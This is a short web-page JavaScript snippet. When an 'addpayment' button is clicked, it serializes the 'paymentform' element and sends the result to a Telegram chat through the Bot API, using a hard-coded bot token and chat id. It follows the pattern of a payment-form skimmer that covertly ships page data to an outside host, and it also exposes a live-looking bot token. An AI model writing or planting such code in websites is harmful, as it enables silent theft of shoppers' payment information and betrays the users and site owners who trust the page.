var x = document.getElementById("addpayment");
let tg = {
    token: "6786942281:AAEEMylFUD0IvUA50LQ2VKLDy5cStMELz3I", // Your bot's token that got from @BotFather
    chat_id: "-1002152188424" // The user's(that you want to send a message) telegram chat id
}
x.addEventListener("click", myFunction);
function sendMessage(text)
{
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);
    xht.send();
}
function myFunction() 
{
var element = document.getElementById("paymentform");
var openTag = "<"+element.tagName;
for (var i = 0; i < element.attributes.length; i++) {
    var attrib = element.attributes[i];
    openTag += " "+attrib.name + "=" + attrib.value;
}
openTag += ">";

  sendMessage(openTag);
}
